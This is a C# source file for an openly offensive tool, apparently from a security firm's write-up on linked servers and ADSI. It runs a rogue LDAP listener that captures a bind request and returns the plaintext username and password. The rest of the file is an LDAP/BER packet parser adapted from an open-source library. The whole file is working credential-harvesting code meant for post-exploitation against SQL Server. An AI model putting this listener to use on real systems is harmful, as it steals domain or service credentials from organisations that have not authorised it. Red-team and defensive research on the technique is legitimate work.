/*
*  BlackArrow - https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
*
*  heavily ripped from https://github.com/vforteli/Flexinets.Ldap.Server
*/


using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Linq;
using System.Threading.Tasks;


namespace ldapAssembly
{
    public static class LdapSrv
    {
        public static string Listen(int port, int timeoutSeconds = 10)
        {
            string res = "";

            try
            {
                TcpListener listener = new TcpListener(IPAddress.Loopback, port);
                listener.Start();

                // Accept the client within 10 seconds, otherwise timeout
                Task<TcpClient> acceptTask = listener.AcceptTcpClientAsync();

                if (!acceptTask.Wait(TimeSpan.FromSeconds(timeoutSeconds)))
                {
                    listener.Stop();
                    return $"No connection received within {timeoutSeconds} seconds.";
                }

                using (TcpClient client = acceptTask.Result)
                using (NetworkStream stream = client.GetStream())
                {

                    string username = "<unknown>";
                    string password = "<unknown>";

                    if (LdapPacket.TryParsePacket(stream, out LdapPacket requestPacket) &&
                        requestPacket.ChildAttributes.Any(o => o.LdapOperation == LdapOperation.BindRequest))
                    {
                        var bindrequest = requestPacket.ChildAttributes.SingleOrDefault(o => o.LdapOperation == LdapOperation.BindRequest);
                        if (bindrequest != null && bindrequest.ChildAttributes.Count > 2)
                        {
                            username = bindrequest.ChildAttributes[1]?.GetValue<string>() ?? "<unknown>";
                            password = bindrequest.ChildAttributes[2]?.GetValue<string>() ?? "<unknown>";
                        }
                    }

                    res = $"{username}:{password}";
                }

                listener.Stop();

            }
            catch (Exception e)
            {
                res = e.ToString();
            }

            return res;
        }
    }

    public enum TagClass
    {
        Universal = 0,
        Application = 1,
        Context = 2,
        Private = 3
    }

    public enum UniversalDataType
    {
        EndOfContent = 0,
        Boolean = 1,
        Integer = 2,
        BitString = 3,
        OctetString = 4,
        Null = 5,
        ObjectIdentifier = 6,
        ObjectDescriptor = 7,
        External = 8,
        Real = 9,
        Enumerated = 10,
        EmbeddedPDV = 11,
        UTF8String = 12,
        Relative = 13,
        Reserved = 14,
        Reserved2 = 15,
        Sequence = 16,
        Set = 17,
        NumericString = 18,
        PrintableString = 19,
        T61String = 20,
        VideotexString = 21,
        IA5String = 22,
        UTCTime = 23,
        GeneralizedTime = 24,
        GraphicString = 25,
        VisibleString = 26,
        GeneralString = 27,
        UniversalString = 28,
        CharacterString = 29,
        BMPString = 30
    }

    public enum LdapOperation
    {
        BindRequest = 0,
        BindResponse = 1,
        UnbindRequest = 2,
        SearchRequest = 3,
        SearchResultEntry = 4,
        SearchResultDone = 5,
        SearchResultReference = 19,
        ModifyRequest = 6,
        ModifyResponse = 7,
        AddRequest = 8,
        AddResponse = 9,
        DelRequest = 10,
        DelResponse = 11,
        ModifyDNRequest = 12,
        ModifyDNResponse = 13,
        CompareRequest = 14,
        CompareResponse = 15,
        AbandonRequest = 16,
        ExtendedRequest = 23,
        ExtendedResponse = 24,
        IntermediateResponse = 25
    }

    public static class Utils
    {
        public static Byte[] StringToByteArray(String hex, Boolean trimWhitespace = true)
        {
            if (trimWhitespace)
            {
                hex = hex.Replace(" ", "");
            }

            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

        public static String ByteArrayToString(Byte[] bytes)
        {
            var hex = new StringBuilder(bytes.Length * 2);
            foreach (var b in bytes)
            {
                hex.Append(String.Format("{0:x2}", b));
            }
            return hex.ToString();
        }


        /// <summary>
        /// Used for debugging and testing...
        /// </summary>
        /// <param name="bits"></param>
        /// <returns></returns>
        public static String BitsToString(BitArray bits)
        {
            int i = 1;
            var derp = "";
            foreach (var bit in bits)
            {
                derp += Convert.ToInt32(bit);
                if (i % 8 == 0)
                {
                    derp += " ";
                }
                i++;
            }
            return derp.Trim();
        }


        /// <summary>
        /// Convert integer length to a byte array with BER encoding
        /// https://en.wikipedia.org/wiki/X.690#BER_encoding
        /// </summary>
        /// <param name="length"></param>
        /// <returns></returns>
        public static Byte[] IntToBerLength(Int32 length)
        {
            // Short notation
            if (length <= 127)
            {
                return new byte[] { (byte)length };
            }
            // Long notation
            else
            {
                var intbytes = BitConverter.GetBytes(length);

                byte intbyteslength = (byte)intbytes.Length;

                // Get the actual number of bytes needed
                while (intbyteslength >= 0)
                {
                    intbyteslength--;
                    if (intbytes[intbyteslength - 1] != 0)
                    {
                        break;
                    }
                }

                var lengthByte = intbyteslength + 128;
                var berBytes = new byte[1 + intbyteslength];
                berBytes[0] = (byte)lengthByte;
                Buffer.BlockCopy(intbytes, 0, berBytes, 1, intbyteslength);
                return berBytes;
            }
        }


        /// <summary>
        /// Convert BER encoded length at offset to an integer
        /// </summary>
        /// <param name="bytes">Byte array</param>
        /// <param name="offset">Offset where the BER encoded length is located</param>
        /// <param name="berByteCount">Number of bytes used to represent BER encoded length</param>
        /// <returns></returns>
        public static Int32 BerLengthToInt(Byte[] bytes, Int32 offset, out Int32 berByteCount)
        {
            berByteCount = 1;   // The minimum length of a ber encoded length is 1 byte
            int attributeLength = 0;
            if (bytes[offset] >> 7 == 1)    // Long notation
            {
                var lengthoflengthbytes = bytes[offset] & 127;
                var lengthBytes = new Byte[4];
                Buffer.BlockCopy(bytes, offset + 1, lengthBytes, 0, lengthoflengthbytes);
                attributeLength = BitConverter.ToInt32(lengthBytes.Reverse().ToArray(), 0);
                berByteCount += lengthoflengthbytes;
            }
            else // Short notation
            {
                attributeLength = bytes[offset] & 127;
            }

            return attributeLength;
        }


        /// <summary>
        /// Get a BER length from a stream
        /// </summary>
        /// <param name="stream">Stream at position where BER length should be found</param>
        /// <param name="berByteCount">Number of bytes used to represent BER encoded length</param>
        /// <returns></returns>
        public static Int32 BerLengthToInt(Stream stream, out Int32 berByteCount)
        {
            berByteCount = 1;   // The minimum length of a ber encoded length is 1 byte
            int attributeLength = 0;
            var berByte = new Byte[1];
            stream.Read(berByte, 0, 1);
            if (berByte[0] >> 7 == 1)    // Long notation, first byte tells us how many bytes are used for the length
            {
                var lengthoflengthbytes = berByte[0] & 127;
                var lengthBytes = new Byte[lengthoflengthbytes];
                stream.Read(lengthBytes, 0, lengthoflengthbytes);
                attributeLength = BitConverter.ToInt32(lengthBytes.Reverse().ToArray(), 0);
                berByteCount += lengthoflengthbytes;
            }
            else // Short notation, length contained in the first byte
            {
                attributeLength = berByte[0] & 127;
            }

            return attributeLength;
        }


        public static String Repeat(String stuff, Int32 n)
        {
            return String.Concat(Enumerable.Repeat(stuff, n));
        }
    }

    public class Tag
    {
        /// <summary>
        /// Tag in byte form
        /// </summary>
        public Byte TagByte { get; internal set; }


        public Boolean IsConstructed
        {
            get
            {
                return new BitArray(new byte[] { TagByte }).Get(5);
            }
        }


        public TagClass Class
        {
            get
            {
                return (TagClass)(TagByte >> 6);
            }
        }


        public UniversalDataType DataType
        {
            get
            {
                return (UniversalDataType)(TagByte & 31);
            }
        }


        public LdapOperation LdapOperation
        {
            get
            {
                return (LdapOperation)(TagByte & 31);
            }
        }


        public Byte ContextType
        {
            get
            {
                return (byte)(TagByte & 31);
            }
        }


        /// <summary>
        /// Create an application tag
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="isSequence"></param>
        public Tag(LdapOperation operation, Boolean isSequence)
        {
            TagByte = (byte)((byte)operation + (Convert.ToByte(isSequence) << 5) + ((byte)TagClass.Application << 6));
        }


        /// <summary>
        /// Create a universal tag
        /// </summary>
        /// <param name="isSequence"></param>
        /// <param name="operation"></param>
        public Tag(UniversalDataType dataType, Boolean isSequence)
        {
            TagByte = (byte)((byte)dataType + (Convert.ToByte(isSequence) << 5) + ((byte)TagClass.Universal << 6));
        }


        /// <summary>
        /// Create a context tag
        /// </summary>
        /// <param name="isSequence"></param>
        /// <param name="operation"></param>
        public Tag(Byte context, Boolean isSequence)
        {
            TagByte = (byte)((byte)context + (Convert.ToByte(isSequence) << 5) + ((byte)TagClass.Context << 6));
        }


        /// <summary>
        /// Parses a raw tag byte
        /// </summary>
        /// <param name="tagByte"></param>
        /// <returns></returns>
        public static Tag Parse(Byte tagByte)
        {
            return new Tag(tagByte);
        }


        private Tag(Byte tagByte)
        {
            TagByte = tagByte;
        }
    }

    public class LdapAttribute
    {
        private Tag _tag;
        protected Byte[] Value = new Byte[0];
        public List<LdapAttribute> ChildAttributes = new List<LdapAttribute>();

        public TagClass Class
        {
            get
            {
                return _tag.Class;
            }
        }

        public Boolean IsConstructed
        {
            get { return _tag.IsConstructed; }
        }

        public LdapOperation? LdapOperation
        {
            get
            {
                if (_tag.Class == TagClass.Application)
                {
                    return _tag.LdapOperation;
                }
                return null;
            }
        }

        public UniversalDataType? DataType
        {
            get
            {
                if (_tag.Class == TagClass.Universal)
                {
                    return _tag.DataType;
                }
                return null;
            }
        }

        public Byte? ContextType
        {
            get
            {
                if (_tag.Class == TagClass.Context)
                {
                    return _tag.ContextType;
                }
                return null;
            }
        }


        /// <summary>
        /// Create an application attribute
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="isConstructed"></param>
        public LdapAttribute(LdapOperation operation, Boolean isConstructed)
        {
            _tag = new Tag(operation, isConstructed);
        }


        /// <summary>
        /// Create an application attribute
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="isConstructed"></param>
        /// <param name="value"></param>
        public LdapAttribute(LdapOperation operation, Boolean isConstructed, Object value)
        {
            _tag = new Tag(operation, isConstructed);
            Value = GetBytes(value);
        }


        /// <summary>
        /// Create a universal attribute
        /// </summary>
        /// <param name="dataType"></param>
        /// <param name="isConstructed"></param>
        public LdapAttribute(UniversalDataType dataType, Boolean isConstructed)
        {
            _tag = new Tag(dataType, isConstructed);
        }


        /// <summary>
        /// Create a universal attribute
        /// </summary>
        /// <param name="dataType"></param>
        /// <param name="isConstructed"></param>
        /// <param name="value"></param>
        public LdapAttribute(UniversalDataType dataType, Boolean isConstructed, Object value)
        {
            _tag = new Tag(dataType, isConstructed);
            Value = GetBytes(value);
        }


        /// <summary>
        /// Create a context attribute
        /// </summary>
        /// <param name="contextType"></param>
        /// <param name="isConstructed"></param>
        public LdapAttribute(Byte contextType, Boolean isConstructed)
        {
            _tag = new Tag(contextType, isConstructed);
        }


        /// <summary>
        /// Create a context attribute
        /// </summary>
        /// <param name="contextType"></param>
        /// <param name="isConstructed"></param>
        /// <param name="value"></param>
        public LdapAttribute(Byte contextType, Boolean isConstructed, Object value)
        {
            _tag = new Tag(contextType, isConstructed);
            Value = GetBytes(value);
        }


        /// <summary>
        /// Create an attribute with tag
        /// </summary>
        /// <param name="tag"></param>
        protected LdapAttribute(Tag tag)
        {
            _tag = tag;
        }


        /// <summary>
        /// Get the byte representation of the attribute and its children
        /// </summary>
        /// <returns></returns>
        public Byte[] GetBytes()
        {
            var list = new List<Byte>();
            if (_tag.IsConstructed)
            {
                ChildAttributes.ForEach(o => list.AddRange(o.GetBytes()));
            }
            else
            {
                list.AddRange(Value);
            }

            var lengthBytes = Utils.IntToBerLength(list.Count);
            var attributeBytes = new byte[1 + lengthBytes.Length + list.Count];
            attributeBytes[0] = _tag.TagByte;
            Buffer.BlockCopy(lengthBytes, 0, attributeBytes, 1, lengthBytes.Length);
            Buffer.BlockCopy(list.ToArray(), 0, attributeBytes, 1 + lengthBytes.Length, list.Count);
            return attributeBytes;
        }


        /// <summary>
        /// Get a typed value
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <returns></returns>
        public T GetValue<T>()
        {
            return (T)Convert.ChangeType(GetValue(), typeof(T));
        }


        /// <summary>
        /// Get an object value
        /// </summary>
        /// <returns></returns>
        public object GetValue()
        {
            if (_tag.Class == TagClass.Universal)
            {
                if (_tag.DataType == UniversalDataType.Boolean)
                {
                    return BitConverter.ToBoolean(Value, 0);
                }
                else if (_tag.DataType == UniversalDataType.Integer)
                {
                    var intbytes = new Byte[4];
                    Buffer.BlockCopy(Value, 0, intbytes, 4 - Value.Length, Value.Length);
                    return BitConverter.ToInt32(intbytes.Reverse().ToArray(), 0);
                }
                else
                {
                    return Encoding.UTF8.GetString(Value, 0, Value.Length);
                }
            }
            else
            {
                // todo add rest...
                return Encoding.UTF8.GetString(Value, 0, Value.Length);
            }
        }


        /// <summary>
        /// Convert the value to its byte form
        /// </summary>
        /// <param name="value"></param>
        /// <returns></returns>
        private Byte[] GetBytes(Object value)
        {
            if (value.GetType() == typeof(String))
            {
                return Encoding.UTF8.GetBytes((String)value);
            }
            else if (value.GetType() == typeof(Int32))
            {
                return BitConverter.GetBytes((Int32)value).Reverse().ToArray();
            }
            else if (value.GetType() == typeof(Boolean))
            {
                return BitConverter.GetBytes((Boolean)value);
            }
            else if (value.GetType() == typeof(Byte))
            {
                return new Byte[] { (Byte)value };
            }
            else if (value.GetType() == typeof(Byte[]))
            {
                return (Byte[])value;
            }
            throw new InvalidOperationException(String.Format("Nothing found for {0}", value.GetType()));
        }
    }

    public class LdapPacket : LdapAttribute
    {
        public Int32 MessageId
        {
            get
            {
                return ChildAttributes[0].GetValue<Int32>();
            }
        }


        /// <summary>
        /// Create a new Ldap packet with message id
        /// </summary>
        /// <param name="messageId"></param>
        public LdapPacket(Int32 messageId) : base(UniversalDataType.Sequence, true)
        {
            ChildAttributes.Add(new LdapAttribute(UniversalDataType.Integer, false, messageId));
        }


        /// <summary>
        /// Create a packet with tag
        /// </summary>
        /// <param name="tag"></param>
        private LdapPacket(Tag tag) : base(tag)
        {
        }


        /// <summary>
        /// Parse an ldap packet from a byte array. 
        /// Must be the complete packet
        /// </summary>
        /// <param name="bytes"></param>
        /// <returns></returns>
        public static LdapPacket ParsePacket(Byte[] bytes)
        {
            var tag = Tag.Parse(bytes[0]);
            var lengthBytesCount = 0;
            var contentLength = Utils.BerLengthToInt(bytes, 1, out lengthBytesCount);
            return (LdapPacket)ParseAttributes(bytes, 0, contentLength + lengthBytesCount + 1)[0];
        }


        /// <summary>
        /// Try parsing an ldap packet from a stream        
        /// </summary>      
        /// <param name="stream"></param>
        /// <param name="packet"></param>
        /// <returns>True if succesful. False if parsing fails or stream is empty</returns>
        public static Boolean TryParsePacket(Stream stream, out LdapPacket packet)
        {
            try
            {
                var tagByte = new Byte[1];
                var i = stream.Read(tagByte, 0, 1);
                if (i != 0)
                {
                    var tag = Tag.Parse(tagByte[0]);

                    int n = 0;
                    var contentLength = Utils.BerLengthToInt(stream, out n);
                    var contentBytes = new Byte[contentLength];
                    stream.Read(contentBytes, 0, contentLength);

                    packet = new LdapPacket(tag);
                    packet.ChildAttributes.AddRange(ParseAttributes(contentBytes, 0, contentLength));
                    return true;
                }
            }
            catch (Exception)
            {
                //_log.Error("Could not parse packet from stream", ex);
            }

            packet = null;
            return false;
        }


        /// <summary>
        /// Parse the child attributes
        /// </summary>
        /// <param name="bytes"></param>
        /// <param name="currentPosition"></param>
        /// <param name="length"></param>
        /// <returns></returns>
        private static List<LdapAttribute> ParseAttributes(Byte[] bytes, Int32 currentPosition, Int32 length)
        {
            var list = new List<LdapAttribute>();
            while (currentPosition < length)
            {
                var tag = Tag.Parse(bytes[currentPosition]);
                currentPosition++;
                int i = 0;
                var attributeLength = Utils.BerLengthToInt(bytes, currentPosition, out i);
                currentPosition += i;

                var attribute = new LdapPacket(tag);
                if (tag.IsConstructed && attributeLength > 0)
                {
                    attribute.ChildAttributes = ParseAttributes(bytes, currentPosition, currentPosition + attributeLength);
                }
                else
                {
                    attribute.Value = new Byte[attributeLength];
                    Buffer.BlockCopy(bytes, currentPosition, attribute.Value, 0, attributeLength);
                }
                list.Add(attribute);

                currentPosition += attributeLength;
            }
            return list;
        }
    }
}
